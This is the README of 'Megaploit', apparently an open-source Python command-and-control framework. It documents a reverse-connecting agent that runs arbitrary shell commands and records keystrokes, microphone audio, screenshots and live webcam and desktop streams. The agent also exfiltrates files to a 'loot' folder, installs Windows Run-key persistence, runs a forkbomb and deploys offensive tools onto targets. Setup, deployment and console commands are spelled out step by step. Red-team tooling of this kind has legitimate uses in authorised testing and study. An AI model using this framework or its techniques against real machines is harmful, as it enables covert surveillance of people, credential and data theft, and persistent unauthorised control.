# Megaploit

**Professional Remote Access Framework · v2.0.0**

> **For authorised security research and penetration testing only.**
> You must have explicit written permission before using this tool against any system.
> Misuse is illegal and unethical. The authors accept no liability.

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Requirements](#requirements)
4. [Installation](#installation)
   - [Automated (Linux)](#automated-linux)
   - [Manual](#manual)
5. [Quick Start](#quick-start)
6. [Server Console](#server-console)
   - [Global Commands](#global-commands)
   - [Session Commands](#session-commands)
   - [Options](#options)
7. [Toolbox](#toolbox)
   - [Installing Tools](#installing-tools)
   - [Running Tools](#running-tools)
   - [Supported Languages](#supported-languages)
   - [Update Checker](#update-checker)
8. [Plugin System](#plugin-system)
   - [Writing a Plugin](#writing-a-plugin)
   - [Command Kinds](#command-kinds)
   - [Placeholders](#placeholders)
   - [Python Plugins](#python-plugins)
   - [Plugin CLI Commands](#plugin-cli-commands)
9. [Agent](#agent)
   - [Generating the Payload](#generating-the-payload)
   - [Deploying the Agent](#deploying-the-agent)
10. [Streaming](#streaming)
11. [Loot](#loot)
12. [Security Model](#security-model)
    - [Authentication](#authentication)
    - [Transport Encryption](#transport-encryption)
    - [Secret Key](#secret-key)
13. [Module Reference](#module-reference)
    - [megaploit.core](#megaploitcore)
    - [megaploit.server](#megaploitserver)
    - [megaploit.agent](#megaploitagent)
    - [megaploit.streaming](#megaploitstreaming)
    - [megaploit.toolbox](#megaploittoolbox)
    - [megaploit.plugins](#megaploitplugins)
14. [Wire Protocol](#wire-protocol)
15. [Directory Layout](#directory-layout)
16. [Contributing](#contributing)

---

## Overview

Megaploit is a modular, extensible C2 (Command & Control) framework written in Python 3.10+.

Key properties:

- **Metasploit-style console** — animated banner, colour-coded prompts, spinner, tab-completion, multi-session support
- **Multi-session** — the server handles unlimited simultaneous agent connections; `use <id>` to switch
- **HMAC-SHA256 authentication** — every connection is challenge-response authenticated before any command runs
- **Hardened TLS 1.2+** — optional; enforces AEAD-only cipher suites, no renegotiation, no compression, forward secrecy required
- **Rate limiter + IP allowlist** — per-IP sliding-window rate limiter auto-bans after 5 failed attempts; optional `--allow-ip` restricts who can even attempt auth
- **Audit log** — every connection attempt, result, and cipher suite recorded to `loot/audit.log` with UTC timestamps
- **Toolbox** — install any GitHub tool in any language (Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++) and run it locally against victims or deploy it onto the target machine
- **Plugin system** — community-contributed TOML files that add new commands without writing Python
- **Live streaming** — MJPEG desktop stream (port 5000) and webcam stream (port 5001) with filters and recording
- **Audio recording** — via `sounddevice` + `soundfile`; no system PortAudio build required
- **Background update checker** — notifies you of updates for Megaploit itself and every installed tool

---

## Architecture

```
Megaploit-main/
├── server.py                    ← operator entry-point
├── agent.py                     ← agent payload entry-point
├── secret.key                   ← shared HMAC secret (you generate this)
├── cert.pem / key.pem           ← TLS certs (optional)
├── requirements.txt
├── install.sh
├── plugins/                     ← drop *.toml plugin files here
│   └── example.toml
├── tools/                       ← toolbox clones land here
│   └── tools.json               ← persistent tool catalogue
├── loot/                        ← all collected data
│   ├── screenshots/
│   ├── recordings/
│   ├── downloads/
│   └── audit.log                ← connection audit trail (UTC timestamps)
└── megaploit/
    ├── core/                    ← shared constants, protocol, crypto
    ├── server/                  ← CLI, listener, sessions, commands
    ├── agent/                   ← connection loop, command handlers, keylogger
    ├── streaming/               ← Flask MJPEG servers
    ├── toolbox/                 ← GitHub tool installer, runner, updater
    └── plugins/                 ← TOML plugin loader and runner
```

The server and agent are completely separate processes. The agent connects *back* to the server (reverse shell model), so no inbound firewall rule is needed on the victim.

---

## Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ preferred (stdlib `tomllib`; 3.10 uses `tomli` polyfill) |
| `git` on PATH | For toolbox clone/update and self-update checks |
| Linux / macOS / Windows | Agent supports all three; server recommended on Linux |

Python packages are listed in [`requirements.txt`](requirements.txt).  
Notable choices:

- **`sounddevice` + `soundfile`** instead of PyAudio — ships bundled PortAudio binaries, no system library needed
- **`tomli`** (Python 3.10 only) — TOML parser for the plugin system; Python 3.11 uses the stdlib `tomllib`
- **`Flask` + `Werkzeug`** — agent-side MJPEG streaming servers

---

## Installation

### Automated (Linux)

```bash
sudo bash install.sh
```

The installer:
1. Detects your distro family (Debian/Ubuntu/Kali, Arch/Manjaro, Fedora, RHEL/CentOS)
2. Installs system packages (`git`, `python3`, `python3-pip`, OpenGL libs for streaming)
3. Checks for Python ≥ 3.10
4. Clones Megaploit to `/opt/megaploit`
5. Installs Python dependencies via pip
6. Creates a `/usr/local/bin/megaploit` shell wrapper

After installation:

```bash
megaploit -lh <your-ip> -p 4444
```

### Manual

```bash
git clone https://github.com/JosephFrankFir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
```

---

## Quick Start

**Step 1 — Generate a shared secret key** (do this once):

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

Copy `secret.key` to the target machine alongside `agent.py`.

**Step 2 — Start the server**:

```bash
python3 server.py -lh 192.168.1.10 -p 4444
```

**Step 3 — Generate and deploy the agent**:

Inside the Megaploit console:
```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate
```

Copy `agent.py` and `secret.key` to the target, then run:
```bash
python3 agent.py
```

**Step 4 — Interact with the session**:

```
megaploit > sessions
megaploit > use 1
megaploit session(1) > sysinfo
megaploit session(1) > screenshot
megaploit session(1) > shell whoami
```

---

## Server Console

Start the server console:

```
python3 server.py -lh <callback-ip> -p <port> [options]

Options:
  -lh, --lhost       IP the agent connects back to (required)
  -p,  --port        TCP port (required)
  -rh, --rhost       Bind IP for the listener socket (default: 0.0.0.0)
  --cert             SSL certificate file (PEM) — enables TLS 1.2+
  --key              SSL private key file (PEM) — enables TLS 1.2+
  --secret           Path to secret.key (default: secret.key)
  --allow-ip <IP>    Allowlisted source IP (repeat for multiple).
                     If omitted, all IPs may attempt authentication.
```

### Global Commands

These commands are available at the top-level `megaploit >` prompt:

| Command | Description |
|---|---|
| `sessions` | List all active sessions with ID, IP, port, and uptime |
| `use <id>` | Enter the session interaction prompt for session `<id>` |
| `generate [-c] [--tls]` | Patch `megaploit/agent/connection.py` with LHOST/PORT/USE_TLS; `-c` byte-compiles `agent.py`; `--tls` enables TLS in the agent |
| `set lhost <ip>` | Set the callback IP address |
| `set port <port>` | Set the callback port |
| `set cert <file>` | Set the SSL certificate file |
| `set key <file>` | Set the SSL private key file |
| `toolbox …` | Manage and run toolbox tools (see [Toolbox](#toolbox)) |
| `plugins …` | Manage plugins (see [Plugin CLI Commands](#plugin-cli-commands)) |
| `help` / `?` | Show all global commands, options, installed tools, and loaded plugins |
| `clear` | Clear the terminal |
| `exit` | Gracefully shut down the listener and exit |

### Session Commands

These commands are available inside a session (`megaploit session(N) >`):

| Command | Description |
|---|---|
| `help` | Show all session commands |
| `sysinfo` | OS, hostname, username, architecture, Python version, resolution, CWD |
| `shell <command>` | Execute an arbitrary shell command on the target |
| `cd <directory>` | Change the working directory on the target |
| `upload <local_file>` | Send a file from the operator machine to the target |
| `download <remote_file>` | Retrieve a file from the target to `loot/downloads/` |
| `screenshot` | Capture a PNG screenshot to `loot/screenshots/` |
| `record <seconds>` | Record microphone audio (WAV) to `loot/recordings/` (max 300s) |
| `screen_stream <on\|off>` | Start/stop MJPEG desktop stream at `http://<target>:5000` |
| `webcam <on\|off>` | Start/stop MJPEG webcam stream at `http://<target>:5001` |
| `keylog_start` | Start the keystroke logger on the target |
| `keylog_dump` | Read and print captured keystrokes |
| `keylog_stop` | Stop the keylogger and delete the log file |
| `persist <regname> <filename>` | Install Windows Run-key persistence (Windows targets only) |
| `forkbomb` | Crash the target process tree (Unix only) — **requires YES confirmation** |
| `toolbox_run <name> [args]` | Run an installed toolbox tool *locally* (operator side) against the session IP |
| `toolbox_deploy <name> [args]` | Upload the tool's entry-point to the target and execute it there |
| `back` | Return to the global prompt without closing the session |
| `exit` | Send the exit signal to the agent and close the session |

Any unrecognised input is forwarded verbatim to the agent's shell (equivalent to `shell <input>`).

Commands marked `[!]` in the help output are **dangerous** — the console will prompt for `YES` confirmation before executing.

### Options

Run `set` with no arguments to see current options:

```
megaploit > set
  Option      Value
  ──────────  ────────────────────
  lhost       192.168.1.10
  port        4444
  cert        (none)
  key         (none)
```

---

## Toolbox

The toolbox lets you install any public GitHub repository as a first-class Megaploit tool — regardless of what language it's written in. Tools are catalogued in `tools/tools.json` and persist across restarts.

### Installing Tools

```
megaploit > toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
```

Examples:

```
megaploit > toolbox install https://github.com/sqlmapproject/sqlmap sqlmap "SQL injection tool" --tags web,injection
megaploit > toolbox install https://github.com/OJ/gobuster gobuster "Directory/DNS bruteforcer" --tags web,recon
megaploit > toolbox install https://github.com/projectdiscovery/nuclei nuclei --tags vuln,scan
```

The installer will:
1. Clone the repository with `git clone --depth=1`
2. Auto-detect the language (see [Supported Languages](#supported-languages))
3. Build/install dependencies (venv for Python, `go build` for Go, `cargo build` for Rust, etc.)
4. Detect the entry-point
5. Register the tool with a launch command template

### Running Tools

**Locally** (on the operator machine, targeting the active session's IP):

```
megaploit session(1) > toolbox_run sqlmap -u http://{session_ip}/login
megaploit session(1) > toolbox_run gobuster dir -u http://{session_ip} -w wordlist.txt
```

**Remotely** (upload to target and execute there):

```
megaploit session(1) > toolbox_deploy sqlmap -u http://127.0.0.1/login
```

Other toolbox commands:

| Command | Description |
|---|---|
| `toolbox list` | Show all installed tools with name, status, entry-point, description |
| `toolbox info <name>` | Full details: language, run command, entry-point, path, tags, session usage |
| `toolbox search <query>` | Search by name, description, language, or tag |
| `toolbox update <name>` | `git pull` + rebuild for one tool |
| `toolbox update-all` | Update and rebuild every installed tool |
| `toolbox check-updates` | Force an immediate update check for all tools and Megaploit itself |
| `toolbox remove <name>` | Delete the tool directory and remove from the catalogue |
| `toolbox set-entry <name> <path>` | Override the auto-detected entry-point |

### Supported Languages

| Language | Detection Signal | Build Step |
|---|---|---|
| Python | `requirements.txt`, `setup.py`, `pyproject.toml`, `*.py` | `python -m venv .venv` + `pip install` |
| Go | `go.mod`, `go.sum` | `go build ./...` |
| Rust | `Cargo.toml` | `cargo build --release` |
| Node.js | `package.json` | `npm install` |
| Ruby | `Gemfile`, `*.rb` | `bundle install` |
| Java | `pom.xml`, `build.gradle` | `mvn package` or `gradle build` |
| Bash | `*.sh` at root | `chmod +x` |
| PowerShell | `*.ps1` at root | wraps with `pwsh -ExecutionPolicy Bypass -File` |
| C/C++ | `CMakeLists.txt`, `Makefile` | `cmake + make` or `make` |
| Binary | Executable with no extension | `chmod +x` |

The launch command is stored in the `run_cmd` field of `tools/tools.json` and uses `{entry}` as a placeholder for the absolute entry-point path at runtime.

### Remote Deploy Strategies

| Language | What gets uploaded | How it runs |
|---|---|---|
| Python | `entry.py` + `requirements.txt` | `pip install -r req.txt && python entry.py` |
| Bash / Shell | `entry.sh` | `bash entry.sh` |
| PowerShell | `entry.ps1` | `pwsh -ExecutionPolicy Bypass -File entry.ps1` |
| Ruby | `entry.rb` | `ruby entry.rb` |
| Go / Rust / C binary | compiled binary | `chmod +x && ./binary` |
| Java | `.jar` file | `java -jar tool.jar` |
| Node.js | `entry.js` only | `node entry.js` — **note:** `node_modules` are not uploaded; use `toolbox_run` for dep-heavy Node tools |

### Update Checker

A background daemon thread runs every 5 minutes and compares local and remote git HEAD hashes (using `git ls-remote origin HEAD` — read-only, no fetch). Notifications appear between prompts:

```
  [↑] Update available for sqlmap  abc1234 → def5678
       Run:  toolbox update sqlmap
```

You can also trigger an immediate check:

```
megaploit > toolbox check-updates
```

---

## Plugin System

Megaploit has a TOML-based plugin system that lets anyone extend the framework without writing Python.

Drop a `.toml` file into the `plugins/` directory. It is loaded automatically on startup and is instantly available as a new CLI command. No restart needed after `plugins reload`.

### Writing a Plugin

A plugin file has two sections: `[plugin]` metadata and one or more `[[command]]` blocks.

```toml
[plugin]
name        = "recon"
version     = "1.0.0"
author      = "Alice"
description = "Quick recon commands"

[[command]]
name        = "portscan"
kind        = "local"
description = "nmap scan against the session target"
usage       = "portscan <ports>"
shell       = "nmap -sV -p {arg0} {session_ip}"
min_args    = 1

[[command]]
name        = "getuid"
kind        = "session"
description = "Print current user on the target"
shell       = "id"
```

Save as `plugins/recon.toml`. Run `plugins reload` (or restart). Then:

```
megaploit session(1) > portscan 80,443,8080
megaploit session(1) > getuid
```

### Command Kinds

| `kind` | Runs on | How |
|---|---|---|
| `local` | Operator machine | Spawns a local subprocess; output streamed line-by-line |
| `session` | Active agent | Sends the expanded shell string over the C2 channel; returns agent response |
| `python` | Operator machine | Imports and calls a Python function by dotted path |

### Placeholders

All `shell` strings (and Python handler `context` dicts) support these placeholders:

| Placeholder | Value |
|---|---|
| `{session_ip}` | IP address of the current session |
| `{session_id}` | Numeric ID of the current session |
| `{lhost}` | The operator's `lhost` setting |
| `{port}` | The operator's `port` setting |
| `{arg0}` | First CLI argument after the command name |
| `{arg1}` | Second CLI argument, etc. |

Example — a local command that runs nmap against the target:

```toml
[[command]]
name  = "portscan"
kind  = "local"
shell = "nmap -sV -p {arg0} {session_ip}"
```

Run as: `portscan 1-1000`  →  expands to: `nmap -sV -p 1-1000 192.168.1.42`

### Python Plugins

For advanced plugins that need full Python, set `kind = "python"` and point `handler` at a dotted `module.function` path. The function receives `(args: list[str], context: dict[str, str])` and returns a string or `None`.

```toml
[[command]]
name     = "mycheck"
kind     = "python"
handler  = "plugins.my_checks.run"
min_args = 1
```

`plugins/my_checks.py`:

```python
def run(args, context):
    target = context.get("session_ip", args[0])
    # ... your logic ...
    return f"[+] Done: {target}"
```

The handler module must be importable from the project root. The simplest approach is to place it inside the `plugins/` directory and use the `plugins.mymodule.function` dotted path.

### Plugin CLI Commands

| Command | Description |
|---|---|
| `plugins` | List all loaded plugins and their commands |
| `plugins list` | Same as above |
| `plugins reload` | Re-scan `plugins/` and reload all plugins without restarting |
| `plugins info <name>` | Show full details: author, source file, all commands with kind and description |

Plugins with `dangerous = true` on a command will trigger the same YES-confirmation gate as built-in dangerous commands.

---

## Agent

The agent (`agent.py`) is the payload deployed on the target machine. It:
1. Connects back to the server on `LHOST:PORT` (reverse shell — no inbound rule needed on the target)
2. Performs HMAC-SHA256 authentication
3. Optionally wraps the connection in TLS 1.2+ with AEAD-only ciphers (if `USE_TLS = True`)
4. Enters a receive-execute-respond loop
5. Silently reconnects after disconnection with jitter: `RECONNECT_DELAY + random(0, RECONNECT_JITTER)` seconds

### Generating the Payload

```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate
```

This patches `megaploit/agent/connection.py` with your LHOST, PORT, and USE_TLS values.

**With TLS** (requires `--cert` / `--key` on the server):

```
megaploit > generate --tls
```

**Byte-compile** (makes the `.pyc` slightly harder to read):

```
megaploit > generate -c
```

### Deploying the Agent

The minimum files needed on the target:

```
agent.py
secret.key
megaploit/          ← the entire package directory
```

Run:

```bash
python3 agent.py
```

The agent will silently retry connection every 10 seconds until the server is reachable.

---

## Streaming

Two Flask MJPEG servers can be started remotely via C2 commands:

### Desktop Stream

```
megaploit session(1) > screen_stream on
[+] Screen stream started — http://0.0.0.0:5000
```

Open `http://<target-ip>:5000` in a browser. The stream runs at ~30 fps using `mss` for screen capture and OpenCV for JPEG encoding.

Stop with: `screen_stream off`

### Webcam Stream

```
megaploit session(1) > webcam on
[+] Webcam started — http://0.0.0.0:5001
```

Open `http://<target-ip>:5001` in a browser. The webcam UI provides:

| Button | Effect |
|---|---|
| Stop / Start | Toggle the live camera feed |
| Capture | Save a still frame to `loot/screenshots/` |
| Greyscale | Toggle greyscale filter |
| Negative | Toggle colour-negative filter |
| Face Only | Crop the frame to the first detected face (requires the DNN model in `saved_model/`) |
| Record | Toggle video recording to `loot/recordings/` (XVID AVI) |

Stop with: `webcam off`

---

## Loot

All files collected from sessions are saved under `loot/`:

```
loot/
├── screenshots/     ← shot_<ip>_<n>.png   (from `screenshot` and webcam Capture)
├── recordings/      ← rec_<ip>_<n>.wav    (from `record <seconds>`)
│                      webcam_<ts>.avi      (from webcam Record button)
├── downloads/       ← <n>_<filename>       (from `download <file>`)
└── audit.log        ← connection audit trail (one line per event, UTC timestamps)
```

**Audit log format:**

```
2024-01-15 14:32:01 UTC  LISTEN    bind=0.0.0.0:4444  tls=yes  allowlist=none
2024-01-15 14:32:18 UTC  ACCEPTED  ip=10.0.0.20       port=54321  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
2024-01-15 14:33:01 UTC  REJECTED  ip=192.168.1.99    port=41234  reason=auth_failed
2024-01-15 14:33:05 UTC  BANNED    ip=192.168.1.99    attempts=6  ban_until=14:38:05
2024-01-15 14:33:10 UTC  BLOCKED   ip=192.168.1.99    reason=banned
```

File names include the session IP and an incrementing counter so files from multiple sessions never overwrite each other.

---

## Security Model

### Authentication

Every agent connection is authenticated before any command is accepted:

1. Server sends a random 16-byte challenge
2. Agent responds with `HMAC-SHA256(secret_key, challenge)` — a 32-byte digest
3. Server verifies with `hmac.compare_digest()` (constant-time comparison, prevents timing attacks)
4. Connection is dropped immediately on failure

This means even if an attacker can reach your listener port, they cannot interact with the C2 without the `secret.key`.

### Transport Encryption

TLS is **opt-in** but strongly recommended for any non-lab use. To enable it:

1. Start the server with `--cert cert.pem --key key.pem`
2. Run `generate --tls` to patch the agent

**Enforced when TLS is active:**
- TLS 1.2 minimum (`TLSVersion.TLSv1_2`); TLS 1.3 used automatically where available
- AEAD-only cipher suites: `ECDHE+AESGCM`, `ECDHE+CHACHA20`, `DHE+AESGCM`, `DHE+CHACHA20`
- No CBC, no RC4, no export ciphers, no MD5
- No TLS renegotiation (`OP_NO_RENEGOTIATION`)
- No protocol-level compression (`OP_NO_COMPRESSION`)
- Forward secrecy required (ECDHE/DHE only)

Without TLS the C2 channel is plain TCP. HMAC authentication still protects against unauthorised connections, but traffic is visible on the wire.

Self-signed certificate generation:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=megaploit"
```

### Rate Limiter & IP Allowlist

The listener applies two additional gates before HMAC authentication:

**Rate limiter** — automatically active, no configuration needed:
- Sliding 60-second window per source IP
- After `MAX_AUTH_ATTEMPTS_PER_MIN` (default: 5) attempts, the IP is banned for `IP_BAN_DURATION` (default: 300 s)
- All events written to `loot/audit.log`

**IP allowlist** — opt-in via `--allow-ip`:
```bash
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20 --allow-ip 10.0.0.21
```
Connections from any IP not on the list are dropped before a single byte is read.

### Secret Key

The shared secret key is a 32-byte random value stored as 64 hex characters in `secret.key`.

**Never commit `secret.key` to a repository.**
**Copy it to the target machine via a secure channel before deploying the agent.**

Generate a new key:

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

On startup the console prints a **key fingerprint** — the first 16 hex characters of `SHA-256(key)` — so you can confirm both sides are using the same key without exposing the key itself:

```
[*] Key fingerprint : 3a7f1b2c 9e8d4a05
```

On Unix, if `secret.key` has group or world read permissions, a warning is printed:

```
[!] WARNING: 'secret.key' is readable by group/others (mode 644).
    Fix with:  chmod 600 secret.key
```

---

## Module Reference

### megaploit.core

#### `config.py`

Shared constants used by both server and agent.

| Constant | Default | Description |
|---|---|---|
| `BUFFER_SIZE` | `4096` | Socket read buffer size (bytes) |
| `AUTH_TIMEOUT` | `10` | Seconds before authentication times out (tight to prevent connection-holding) |
| `RECONNECT_DELAY` | `10` | Base seconds the agent waits before reconnecting |
| `RECONNECT_JITTER` | `5` | Random 0–5 s added to each reconnect delay (prevents thundering-herd) |
| `MAX_AUTH_ATTEMPTS_PER_MIN` | `5` | Per-IP rate limit before auto-ban |
| `IP_BAN_DURATION` | `300` | Seconds a rate-limited IP stays banned |
| `END_SENTINEL` | `b"<<MEGAPLOIT_END>>"` | Message framing delimiter |
| `SCREEN_STREAM_PORT` | `5000` | Port for the desktop MJPEG server |
| `WEBCAM_STREAM_PORT` | `5001` | Port for the webcam MJPEG server |
| `MAX_RECORD_SECONDS` | `300` | Maximum microphone recording length |
| `AUDIT_LOG` | `"loot/audit.log"` | Path to the connection audit log |
| `KEYLOG_PATH` | Platform-dependent | Hidden path for the keystroke log file |

#### `crypto.py`

HMAC-SHA256 authentication helpers.

```python
load_key(path="secret.key") -> bytes
```
Load and hex-decode the shared secret. Checks file permissions on Unix and warns if world-readable. Calls `sys.exit(1)` on failure.

```python
key_fingerprint(key: bytes) -> str
```
Returns the first 16 hex chars of `SHA-256(key)` — printed on startup as a human-readable identity check.

```python
server_authenticate(conn, secret_key, timeout=10) -> bool
```
Server side: send a 16-byte random challenge, read the 32-byte HMAC response, verify it.

```python
agent_authenticate(conn, secret_key, timeout=15) -> bool
```
Agent side: receive the challenge, compute and send the HMAC response.

#### `protocol.py`

Wire protocol functions. All messages are JSON-encoded and delimited by `END_SENTINEL`. Binary transfers stream raw bytes followed by `END_SENTINEL`.

```python
send_msg(conn, data)           # JSON-encode and send; data can be any JSON-serialisable object
recv_msg(conn) -> object       # Block until a full JSON message is received
send_file(conn, path)          # Stream a file to conn + sentinel
recv_file(conn, path, timeout) # Receive a file from conn, write to path
```

---

### megaploit.server

#### `session.py` — `Session`

Dataclass representing one authenticated agent connection.

| Field | Type | Description |
|---|---|---|
| `conn` | `socket.socket` | The connected socket |
| `ip` | `str` | Agent IP address |
| `port` | `int` | Agent source port |
| `id` | `int` | Sequential session ID (assigned by `Listener`) |
| `connected_at` | `float` | Unix timestamp of connection |

Properties: `label` (`ip:port`), `uptime` (`HH:MM:SS` string).  
Methods: `close()`, `screenshot_path()`, `recording_path()`, `download_path(remote_name)`.

#### `listener.py` — `Listener`

Runs a TCP accept loop in a background daemon thread. Each incoming connection passes through five hardening layers in order: IP allowlist → rate limiter → TLS upgrade → HMAC auth → session creation. Every outcome is written to `loot/audit.log`.

```python
Listener(bind_host, port, secret_key, on_session, ssl_context=None, allowed_ips=None)
listener.start()   # non-blocking
listener.stop()
```

`allowed_ips` — `list[str] | None`. Pass a list of IP strings to enable the allowlist; `None` (default) allows all IPs.

```python
build_ssl_context(certfile, keyfile) -> ssl.SSLContext
```
Returns a hardened server TLS context: TLS 1.2+, AEAD ciphers, no renegotiation, no compression, forward secrecy.

```python
build_agent_ssl_context() -> ssl.SSLContext
```
Returns a matching hardened client TLS context for the agent (cert verification disabled for self-signed certs).

#### `commands.py`

Command registry and dispatcher.

```python
@_cmd(name, usage="", help_text="", dangerous=False)
def my_handler(session: Session, args: list[str]) -> CommandResult:
    ...
```

Use the `@_cmd()` decorator to register a new built-in command.

```python
CommandResult(ok: bool, output: str = "", close_session: bool = False)
```

```python
dispatch(session, raw_input) -> CommandResult
```
Parse `raw_input`, find the handler, call it. Forwards unrecognised input as a shell command.

```python
all_commands() -> dict[str, _CommandDef]
```
Returns the full command registry (used by the help renderer and dangerous-command gate).

#### `cli.py` — `Console`

The interactive operator console. Call `console.run(...)` to start. Internally manages the global prompt loop, session interaction loop, plugin loading, update checker, and all sub-command dispatchers.

---

### megaploit.agent

#### `connection.py`

Persistent connect-back loop. Configuration constants patched by `generate`:

| Constant | Default | Description |
|---|---|---|
| `LHOST` | `"127.0.0.1"` | Server IP to connect back to |
| `PORT` | `4444` | Server port |
| `USE_TLS` | `False` | Whether to wrap the socket in SSL |

```python
start(secret_key_path="secret.key")
```
Runs forever: connect → authenticate → run_shell → reconnect after delay.

#### `shell.py` — `run_shell(conn)`

The receive-execute-respond loop. Calls `handle(conn, cmd)` from `handlers.py` for each command received. Exits on `"exit"` or socket close.

#### `handlers.py`

All agent-side command implementations, registered with `@_register("name")`.

| Handler | Description |
|---|---|
| `cd` | `os.chdir()` + return new CWD |
| `sysinfo` | Platform info via `platform` + `getpass` + `pyautogui.size()` |
| `upload` | Receive a file from the server (`recv_file`) |
| `download` | Send a file to the server (`send_file`) |
| `screenshot` | `pyautogui.screenshot()` → `send_file` |
| `record` | `sounddevice.rec()` + `soundfile.write()` → `send_file` |
| `screen_stream` | Start/stop the Flask desktop MJPEG server in a daemon thread |
| `webcam` | Start/stop the Flask webcam MJPEG server in a daemon thread |
| `persist` | Windows Run-key registry persistence |
| `keylog_start` | Start a `Keylogger` instance in a daemon thread |
| `keylog_dump` | Read `KEYLOG_PATH` and return contents |
| `keylog_stop` | Stop the keylogger and delete the log file |
| `forkbomb` | `os.fork()` (Unix only) |

Unrecognised commands fall through to `_shell_exec(cmd)` which runs them via `subprocess.Popen(shell=True)`.

#### `keylogger.py` — `Keylogger`

Uses `pynput.keyboard.Listener`. Appends keystrokes to `KEYLOG_PATH` with special-key labelling (`[Backspace]`, `[Shift]`, etc.).

```python
keylogger.start()       # blocks (run in daemon thread)
keylogger.stop()        # sets threading.Event; listener exits
keylogger.read_logs()   # returns file contents as str
keylogger.destroy()     # stop + delete log file
```

---

### megaploit.streaming

#### `screen.py` — `Camera`

Singleton-style screen grabber. Uses `mss` for fast screen capture and OpenCV for JPEG encoding. A single background daemon thread captures at ~30 fps and stores the latest JPEG frame in a class variable. The thread auto-stops after 10 seconds of inactivity.

```python
camera = Camera()
frame: bytes | None = camera.get_frame()  # latest JPEG bytes
```

#### `desktop.py`

Flask app at port 5000. Route `/` serves `templates/desktop.html`; route `/video_feed` returns an MJPEG stream from `Camera`.

#### `webcam.py`

Flask app at port 5001. Reads from `cv2.VideoCapture(0)`. Supports greyscale, negative, and face-crop (DNN) filters. Server-side video recording via `cv2.VideoWriter`.

Routes:
- `GET /` — `templates/webcam.html` with control buttons
- `GET /video_feed` — MJPEG stream
- `POST /control` — toggle actions: `toggle_grey`, `toggle_neg`, `toggle_face`, `toggle_cam`, `capture`, `toggle_rec`

---

### megaploit.toolbox

#### `registry.py` — `ToolRegistry` / `Tool`

Persistent JSON catalogue at `tools/tools.json`.

```python
Tool(name, repo, description, entry, lang, run_cmd, installed_at, tags)
tool.path          # absolute path to cloned repo
tool.entry_path    # absolute path to entry-point
tool.is_installed  # bool — directory exists
tool.resolved_run_cmd() -> list[str]  # run_cmd with {entry} expanded
```

```python
registry.add(tool)
registry.remove(name)
registry.get(name) -> Tool | None
registry.all() -> list[Tool]
registry.search(query) -> list[Tool]  # searches name, description, lang, tags
```

Language ID constants: `LANG_PYTHON`, `LANG_GO`, `LANG_RUST`, `LANG_NODE`, `LANG_RUBY`, `LANG_JAVA`, `LANG_BASH`, `LANG_POWERSHELL`, `LANG_BINARY`, `LANG_UNKNOWN`.

#### `installer.py`

```python
install(repo_url, name, description="", entry="", tags=None, progress=None) -> Tool
uninstall(name, progress=None)
update(name, progress=None)          # git pull + rebuild
detect_language(repo_dir) -> str
build(repo_dir, name, lang, progress) -> list[str]   # returns run_cmd
detect_entry(repo_dir, name, lang) -> str             # returns relative path
```

`progress` is a `Callable[[str], None]` that receives build log lines.

#### `runner.py`

```python
run_local(name, tool_args, output=None, timeout=None) -> int
```
Resolves `tool.resolved_run_cmd()`, spawns a subprocess, streams stdout/stderr to `output`, returns exit code.

```python
run_remote(name, tool_args, session, output=None, timeout=120)
```
Language-aware upload and execution over the C2 channel.

#### `updater.py` — `UpdateChecker`

```python
checker = UpdateChecker(megaploit_dir=".")
checker.start()     # starts daemon thread (silent if git not on PATH)
checker.stop()
checker.drain() -> Iterator[str]   # yield formatted ANSI update notes
checker.check_now()                # trigger immediate check
```

Checks every `CHECK_INTERVAL` seconds (default: 300). Uses `git ls-remote origin HEAD` — read-only, never modifies the repo.

---

### megaploit.plugins

#### `schema.py` — `Plugin` / `PluginCommand`

```python
Plugin.from_toml(path) -> Plugin   # parse and validate a .toml file
```

```python
@dataclass
class PluginCommand:
    name: str
    kind: str          # "local" | "session" | "python"
    description: str
    usage: str
    shell: str         # for kind=local or kind=session
    handler: str       # dotted path for kind=python
    min_args: int
    dangerous: bool
```

#### `loader.py` — `PluginLoader`

```python
plugin_loader.load_all() -> tuple[int, int]   # (loaded, errors); also works as reload
plugin_loader.plugins() -> list[Plugin]
plugin_loader.get(name) -> Plugin | None
plugin_loader.get_command(name) -> PluginCommand | None
plugin_loader.all_command_names() -> list[str]
plugin_loader.is_plugin_command(name) -> bool
plugin_loader.errors() -> list[tuple[str, str]]  # (filename, message)
```

#### `runner.py` — `run_plugin_command`

```python
run_plugin_command(
    cmd: PluginCommand,
    args: list[str],
    session=None,
    lhost="",
    port=0,
    output=None,
) -> CommandResult
```

Dispatches to `_run_local`, `_run_session`, or `_run_python` based on `cmd.kind`. All backends expand `{placeholder}` strings before execution.

---

## Wire Protocol

All C2 traffic travels on a single persistent TCP connection per session.

```
Client                            Server
  |                                 |
  |  <─── 16-byte random challenge  |   (server sends first)
  |                                 |
  |  HMAC-SHA256(key, challenge) ──>|   (agent responds with 32-byte digest)
  |                                 |
  |  [connected — begin commands]   |
  |                                 |
  |  <── JSON payload + SENTINEL    |   (server sends command)
  |                                 |
  |  JSON response + SENTINEL ─────>|   (agent sends result)
  |           OR                    |
  |  raw bytes + SENTINEL ─────────>|   (agent sends file: screenshot, recording, download)
```

**Message framing**: every JSON message is terminated with `b"<<MEGAPLOIT_END>>"`. The receiver buffers until it sees the sentinel, then decodes the preceding bytes as JSON.

**File transfers**: raw bytes streamed to the socket, terminated with `b"<<MEGAPLOIT_END>>"`. A partial-sentinel buffering scheme ensures the sentinel is never accidentally split across write calls.

**Why JSON + sentinel?** It avoids length-prefix framing complexity, works transparently through TLS, and makes the protocol trivially debuggable with `nc`.

---

## Directory Layout

```
Megaploit-main/
├── server.py                        Server entry-point
├── agent.py                         Agent payload entry-point
├── requirements.txt                 Python dependencies
├── install.sh                       Linux auto-installer
